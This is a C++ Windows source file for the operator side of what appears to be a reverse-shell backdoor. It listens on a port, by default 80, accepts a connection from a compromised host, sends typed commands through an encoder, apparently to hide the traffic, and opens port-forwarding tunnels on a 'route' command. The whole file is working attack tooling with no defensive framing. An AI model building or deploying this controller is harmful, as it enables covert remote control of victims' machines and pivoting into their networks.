
#include <math.h>
#include <memory.h>
#include <stdio.h>
#include <string.h>

#include <string>

#include <windows.h>
#include <winsock.h>

#include "network_encoder.h"
#include "network_tunnal.h"

#pragma comment (lib,"ws2_32")

using std::string;

#define PACKET_SEND_BUFFER  1024
#define PAGE_BUFFER_LENGTH  1024*10

#define DEFAULT_PORT 80


string number_to_string(long in_number) {
    string result;
    char link_string[16]={0};
    sprintf(link_string,"%ld",in_number);
    result=link_string;
    return result;
}

long string_to_number(const char* input_string) {
    long return_number=0;
    try {
        for (int number_index=strlen(input_string)-1;number_index>=0;--number_index,++input_string) {
            if (48<=*input_string && *input_string<=57)
                return_number+=(*input_string-48)*pow(10,number_index);
            else
                return -1;
        }
    } catch (...) {
        return -1;
    }
    return return_number;
}

const string quit("quit");
bool connect_stat=false;

static void recv_thread(unsigned int sock_accept) {
    while (1) {
        char result[PAGE_BUFFER_LENGTH]={0};
        int recv_length=recv(sock_accept,result,PAGE_BUFFER_LENGTH,0);
        if (SOCKET_ERROR!=recv_length) {
            network_decode(result,recv_length);
            printf("%s\n",result);
        } else {
            printf("WARNING! lost connect ..\n");
            break;
        }
    }
    connect_stat=false;
}

void main(void) {
    int bind_port=DEFAULT_PORT;
    char set_bind='N';
    printf("use default port (Y/N)?:");
    scanf("%c",&set_bind);

    if ('N'==set_bind || 'n'==set_bind) {
        printf("set local bind port:");
        scanf("%d",&bind_port);
        gets(&set_bind);
    }

    WSADATA init;
    WSAStartup(1,&init);

    SOCKET sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

    if (SOCKET_ERROR!=sock) {
        sockaddr_in local={0};
        local.sin_family=AF_INET;
        local.sin_port=htons(bind_port);

        if (SOCKET_ERROR!=bind(sock,(const sockaddr*)&local,sizeof(local))) {
            listen(sock,1);

            printf("listening!\n");
            SOCKET sock_accept=accept(sock,NULL,NULL);

            if (SOCKET_ERROR!=sock_accept) {
                connect_stat=true;
                printf("reverse connect OK!:\n");
                CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)recv_thread,(void*)sock_accept,NULL,NULL);
                while (connect_stat) {
                    printf(">");
                    char command[PACKET_SEND_BUFFER]={0};
                    gets(command);
                    string resolve(command);
                    unsigned int command_length=strlen(command);
                    command_length=network_encode(command,command_length);

                    send(sock_accept,command,command_length,0);

                    if (-1!=resolve.find("route")) {
                        string port(resolve.substr(resolve.find_last_of("-L:[")+1,resolve.length()));
                        port=port.substr(0,port.find("]"));
                        if (-1!=port.find(","))
                            port=port.substr(port.find(",")+1,port.length());
                        unsigned int local_port=string_to_number(port.c_str());

                        network_tunnal_open(local_port);
                    }
                    if (resolve==quit) {
                        printf("Exit Server!\n");
                        break;
                    }
                }
                closesocket(sock_accept);
            }
        }
    }
    closesocket(sock);
}
